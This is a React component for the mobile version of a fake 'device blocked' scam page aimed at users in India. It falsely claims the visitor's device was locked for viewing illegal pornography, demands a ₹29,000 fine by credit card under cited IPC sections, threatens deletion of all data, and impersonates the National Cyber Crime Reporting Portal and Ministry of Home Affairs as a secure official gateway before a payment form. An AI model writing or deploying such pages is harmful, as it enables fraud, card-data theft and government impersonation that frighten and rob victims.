
import React from 'react';
import MobilePaymentForm from './MobilePaymentForm';

const MobileContent = () => {
  return (
    <div className="p-3 bg-gray-50 min-h-full">
      {/* Device Blocked Alert */}
      <div className="bg-transparent border-2 border-red-600 p-3 rounded-lg mb-3 text-center">
        <h1 className="text-lg font-bold text-red-600 mb-2">
          YOUR DEVICE HAS BEEN BLOCKED
        </h1>
      </div>

      {/* Red Alert Message - Mobile Optimized */}
      <div className="bg-red-600 text-white p-4 rounded-lg mb-3 shadow-lg">
        <div className="space-y-3 text-xs leading-relaxed">
          <p className="font-semibold">
            Your device has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of India.
          </p>
          
          <p className="font-medium text-yellow-200">
            You must pay a fine of ₹29,000 by credit card as prescribed by IPC section 292 and 293.
          </p>
          
          <p className="text-yellow-200 font-semibold">
            Attention! If you fail to pay a fine, all information on your device will be permanently deleted.
          </p>
          
          <p className="text-xs">
            <strong>Section 292 (1)</strong> A person who distributes obscene objects is punished by imprisonment for not more than 2 years or a fine of not more than ₹2,50,000.
          </p>
          
          <p className="font-medium text-yellow-200">
            Your device will be unlocked automatically after the fine payment.
          </p>
        </div>
      </div>

      {/* Payment Security Notice - Mobile */}
      <div className="bg-white border border-gray-300 text-gray-800 p-3 rounded-lg shadow-lg mb-4">
        <h3 className="text-sm font-bold text-center mb-2">Payment Gateway Security Notice</h3>
        <div className="space-y-2 text-xs leading-relaxed">
          <p>
            <strong>SECURITY NOTICE:</strong> This is an official payment gateway of the National Cyber Crime Reporting Portal, Ministry of Home Affairs, Government of India.
          </p>
          
          <p>
            <strong>Data Protection:</strong> Your financial information is protected under IT Rules 2011 with bank-grade encryption.
          </p>
          
          <p>
            <strong>Transaction Security:</strong> All payments are processed through RBI approved gateways with multi-layer authentication.
          </p>
          
          <p className="font-semibold text-red-600">
            WARNING: This is a secured government portal. Any illegal access attempt is a criminal offense under IT Act, 2000.
          </p>
        </div>
      </div>

      {/* Mobile Payment Form */}
      <MobilePaymentForm />
    </div>
  );
};

export default MobileContent;
